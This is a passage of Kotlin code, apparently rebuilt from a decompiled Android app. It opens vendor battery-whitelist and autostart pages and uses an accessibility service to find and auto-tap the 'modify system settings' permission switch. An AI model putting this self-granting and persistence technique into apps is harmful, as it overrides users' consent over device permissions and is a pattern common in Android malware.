                    val intent = Intent()
                    intent.component = ComponentName(
                        "com.iqoo.secure",
                        "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"
                    )
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (_: Exception) {
                    openWriteSettingsPage()
                }
            }
            DeviceStrategy.SAMSUNG -> {
                // JADX: opens Samsung battery optimization
                try {
                    val intent = Intent()
                    intent.component = ComponentName(
                        "com.samsung.android.lool",
                        "com.samsung.android.sm.battery.ui.BatteryActivity"
                    )
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (_: Exception) {
                    openWriteSettingsPage()
                }
            }
            DeviceStrategy.HONOR -> {
                // JADX: Honor uses Huawei-like path
                try {
                    val intent = Intent()
                    intent.component = ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.process.ProtectActivity"
                    )
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (_: Exception) {
                    openWriteSettingsPage()
                }
            }
            DeviceStrategy.ONEPLUS -> {
                // JADX: OnePlus uses OPPO-like path
                try {
                    val intent = Intent()
                    intent.component = ComponentName(
                        "com.oneplus.security",
                        "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"
                    )
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (_: Exception) {
                    openWriteSettingsPage()
                }
            }
            DeviceStrategy.REALME -> {
                // JADX: Realme uses ColorOS-like path
                try {
                    val intent = Intent()
                    intent.component = ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                    )
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } catch (_: Exception) {
                    openWriteSettingsPage()
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Prefs helpers — JADX: e4(), saveAuthorizationState
    // ═══════════════════════════════════════════════════════════════

    /**
     * Mark WRITE_SETTINGS flow as attempted in SharedPreferences. JADX: e4()
     * Saves write_settings_attempted=true + timestamp.
     */
    fun markWriteSettingsAttempted() {
        try {
            context.getSharedPreferences("write_settings_state", 0)
                .edit()
                .putBoolean("write_settings_attempted", true)
                .putLong("write_settings_attempt_time", System.currentTimeMillis())
                .apply()
            Log.d(TAG, "✅ 已标记WRITE_SETTINGS流程已尝试过")
        } catch (e: Exception) {
            Log.e(TAG, "❌ 标记WRITE_SETTINGS尝试状态失败", e)
        }
    }

    /**
     * Save authorization state (brand, authorized flag, timestamp). JADX: in e6()/f8()
     */
    fun saveAuthorizationState() {
        try {
            val brand = detectBrand()
            context.getSharedPreferences("authorization_state", 0)
                .edit()
                .putBoolean("write_settings_authorized", true)
                .putString("authorization_device_key", brand)
                .putLong("authorization_time", System.currentTimeMillis())
                .apply()
        } catch (e: Exception) {
            Log.e(TAG, "❌ 保存授权状态失败", e)
        }
    }

    /**
     * Log permission failure and clean up. JADX: e5()
     * Records failure reason, marks attempted, sends broadcast, stops request.
     */
    fun logPermissionFailure(reason: String) {
        Log.w(TAG, "❌ WRITE_SETTINGS权限申请失败: $reason")
        markWriteSettingsAttempted()
        sendPermissionResultBroadcast(reason, false)
        stopPermissionRequest()
    }

    // ═══════════════════════════════════════════════════════════════
    // Node finding (instance) — JADX: b3(), b5(), b6(), b9(), c0(),
    //                            c3(), c5(), c6()
    // ═══════════════════════════════════════════════════════════════

    /**
     * Find clickable visible nodes in tree (recursive). JADX: b3()
     * Adds clickable+visible nodes to results and to clickedNodes set.
     */
    fun findPermissionTextNodes(
        depth: Int,
        node: AccessibilityNodeInfo,
        results: ArrayList<AccessibilityNodeInfo>
    ) {
        if (depth > MAX_SEARCH_DEPTH) return
        try {
            if (node.isClickable && node.isVisibleToUser) {
                results.add(node)
                clickedNodes.add(node)
            }
            val childCount = node.childCount
            for (i in 0 until childCount) {
                val child = node.getChild(i) ?: continue
                findPermissionTextNodes(depth + 1, child, results)
                if (!results.contains(child)) {
                    safeRecycle(child)
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Find switch/toggle nodes in tree, recording their bounds info. JADX: b5()
     * Adds visible switch/toggle/checkbox/radioButton/compoundButton nodes.
     */
    fun findPermissionTextNodesAlt(
        depth: Int,
        node: AccessibilityNodeInfo,
        results: ArrayList<AccessibilityNodeInfo>
    ) {
        if (depth > 20) return
        try {
            val className = node.className?.toString() ?: ""
            for (keyword in TOGGLE_CLASS_KEYWORDS) {
                if (className.contains(keyword, true)) {
                    if (node.isVisibleToUser) {
                        val rect = Rect()
                        node.getBoundsInScreen(rect)
                        results.add(node)
                        clickedNodes.add(node)
                        Log.v(TAG, "🔍 找到开关控件: 类='$className', 可点击=${node.isClickable}, " +
                                "可选择=${node.isCheckable}, 位置=$rect, " +
                                "文本='${node.text}', 描述='${node.contentDescription}'")
                    }
                    break
                }
            }
            val childCount = node.childCount
            for (i in 0 until childCount) {
                val child = node.getChild(i) ?: continue
                findPermissionTextNodesAlt(depth + 1, child, results)
                if (!results.contains(child)) {
                    safeRecycle(child)
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Find switch/toggle nodes that are visible + clickable/checkable. JADX: b6()
     */
    fun findPermissionTextNodesAlt2(
        depth: Int,
        node: AccessibilityNodeInfo,
        results: ArrayList<AccessibilityNodeInfo>
    ) {
        if (depth > 20) return
        try {
            val className = node.className?.toString() ?: ""
            for (keyword in TOGGLE_CLASS_KEYWORDS) {
                if (className.contains(keyword, true)) {
                    if (node.isVisibleToUser && (node.isClickable || node.isCheckable)) {
                        results.add(node)
                        clickedNodes.add(node)
                    }
                    break
                }
            }
            val childCount = node.childCount
            for (i in 0 until childCount) {
                val child = node.getChild(i) ?: continue
                findPermissionTextNodesAlt2(depth + 1, child, results)
                if (!results.contains(child)) {
                    safeRecycle(child)
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Find switch node within a container's children (recursive BFS). JADX: b9()
     */
    fun findSwitchInContainer(container: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        return try {
            val queue = ArrayDeque<AccessibilityNodeInfo>()
            queue.addLast(container)
            while (queue.isNotEmpty()) {
                val node = queue.removeFirst()
                val className = node.className?.toString() ?: ""
                if (className.contains("Switch", true) ||
                    className.contains("Toggle", true) ||
                    className.contains("CompoundButton", true)
                ) {
                    return node
                }
                val childCount = node.childCount
                for (i in 0 until childCount) {
                    val child = node.getChild(i)
                    if (child != null) {
                        queue.addLast(child)
                    }
                }
            }
            null
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Find a switch at a given Y position. JADX: c0()
     * Finds all switches, then returns the one whose bounds overlap the target Y.
     */
    fun findSwitchByPosition(root: AccessibilityNodeInfo, targetY: Int): AccessibilityNodeInfo? {
        return try {
            val switches = findAllSwitches(root)
            for (sw in switches) {
                val rect = Rect()
                sw.getBoundsInScreen(rect)
                if (targetY >= rect.top && targetY <= rect.bottom) {
                    return sw
                }
            }
            null
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Find first node in list that matches filter. JADX: c3()
     */
    fun findNodeInListWithFilter(
        list: ArrayList<AccessibilityNodeInfo>,
        filter: (AccessibilityNodeInfo) -> Boolean
    ): AccessibilityNodeInfo? {
        for (node in list) {
            if (filter(node)) return node
        }
        return null
    }

    /**
     * Find switch in container, searching parent chain. JADX: c5()
     * Walks up parent chain, at each level searching siblings for a switch.
     */
    fun findSwitchInContainerAlt(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        return try {
            var current: AccessibilityNodeInfo? = node
            var depth = 0
            while (current != null && depth < 5) {
                val parent = current.parent ?: break
                val sw = findSwitchInContainer(parent)
                if (sw != null) return sw
                current = parent
                depth++
            }
            null
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Find first checked switch. JADX: c6()
     * BFS: returns the first visible, checked switch/toggle/compoundButton.
     */
    fun findFirstCheckedSwitch(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        return try {
            val queue = ArrayDeque<AccessibilityNodeInfo>()
            queue.addLast(root)
            while (queue.isNotEmpty()) {
                val node = queue.removeFirst()
                val className = node.className?.toString() ?: ""
                if ((className.contains("Switch", true) ||
                            className.contains("Toggle", true) ||
                            className.contains("CompoundButton", true)) &&
                    node.isVisibleToUser && node.isChecked
                ) {
                    return node
                }
                val childCount = node.childCount
                for (i in 0 until childCount) {
                    val child = node.getChild(i)
                    if (child != null) {
                        queue.addLast(child)
                    }
                }
            }
            null
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Attempt auto-click safely on root node. JADX: a3() — attemptCoordinateClick
     * Returns true if click was dispatched successfully.
     */
    private suspend fun attemptAutoClickSafe(root: AccessibilityNodeInfo): Boolean {
        return try {
            val toggleNode = findAllowModifyToggle(root)
            Log.d(TAG, "🔍 [autoClick] findAllowModifyToggle=${toggleNode != null}")
            if (toggleNode == null) {
                val fallback = findAllowModifyNode(root)
                Log.d(TAG, "🔍 [autoClick] findAllowModifyNode=${fallback != null}")
                if (fallback != null) {
                    UiDebugger.dumpPage(service, "ws_no_toggle_found", "findAllowModifyToggle=null, findAllowModifyNode=true")
                    performClick(fallback)
                    return true
                }
                // MIUI fallback: no Switch on page — find clickable row or right-side Switch area
                // MIUI's WRITE_SETTINGS page has a clickable PreferenceItem row, not an exposed Switch node
                for (keyword in DangerKeywords.modifySystemSettingsKeywords) {
                    val nodes = root.findAccessibilityNodeInfosByText(keyword) ?: continue
                    for (textNode in nodes) {
                        if (!textNode.isVisibleToUser) continue
                        val nodeId = textNode.viewIdResourceName ?: ""
                        // Whitelist: android:id/title / summary / PreferenceItemView labels
                        // (action bar titles use id like "action_bar_title" — skip them)
                        val isContentTitle = nodeId == "android:id/title" ||
                            nodeId == "android:id/summary" ||
                            nodeId.contains("preference", ignoreCase = true)
                        if (!isContentTitle) {
                            Log.v(TAG, "🔍 [autoClick] MIUI fallback: skip non-content text id=$nodeId")
                            continue
                        }
                        Log.d(TAG, "🔍 [autoClick] MIUI fallback: 找到内容文本「$keyword」(id=$nodeId)")

                        // Strategy A: climb parent chain up to 8 levels for clickable ViewGroup
                        var current: AccessibilityNodeInfo? = textNode.parent
                        var depth = 0
                        while (current != null && depth < 8) {
                            if (current.isClickable && current.isVisibleToUser) {
                                Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy A 点击父容器 depth=$depth class=${current.className}")
                                performClick(current)
                                return true
                            }
                            current = current.parent
                            depth++
                        }

                        // Strategy B: gesture tap on right-side Switch area (MIUI Switch is always on the right)
                        val rect = android.graphics.Rect()
                        textNode.getBoundsInScreen(rect)
                        if (rect.width() > 0 && rect.height() > 0) {
                            val dm = context.resources.displayMetrics
                            val switchX = (dm.widthPixels - 120).toFloat()  // MIUI Switch typically at right 120px
                            val switchY = rect.centerY().toFloat()
                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy B gesture tap right-switch at ($switchX,$switchY)")
                            val tapped = GestureTapHelper.performTap(service, switchX, switchY)
                            if (tapped) {
                                Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy B succeeded")
                                return true
                            }
                            // Strategy C: if right-side tap fails, tap text center with real gesture
                            Log.d(TAG, "🔍 [autoClick] MIUI fallback: strategy C gesture tap text center at ${rect.centerX()},${rect.centerY()}")
                            val tapped2 = GestureTapHelper.performTap(service, rect.centerX().toFloat(), rect.centerY().toFloat())
                            if (tapped2) return true
                        }
                    }
                }
                UiDebugger.dumpPage(service, "ws_no_toggle_found", "findAllowModifyToggle=null, findAllowModifyNode=false, MIUI fallback=false")
                return false
            }
            performClick(toggleNode)
            true
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "❌ attemptAutoClickSafe failed", e)
            false
        }
    }

    /**
     * Scroll down on the current page. JADX: uses f3() swipe gesture
     */
    fun scrollDown() {
        scope.launch {
            try {
                val dm = context.resources.displayMetrics
                val centerX = dm.widthPixels / 2.0f
                val fromY = dm.heightPixels * 0.7f
                val toY = dm.heightPixels * 0.3f
                performSwipeGesture(centerX, fromY, centerX, toY)
            } catch (e: Exception) {
                Log.w(TAG, "scrollDown failed", e)
            }
        }
    }
}
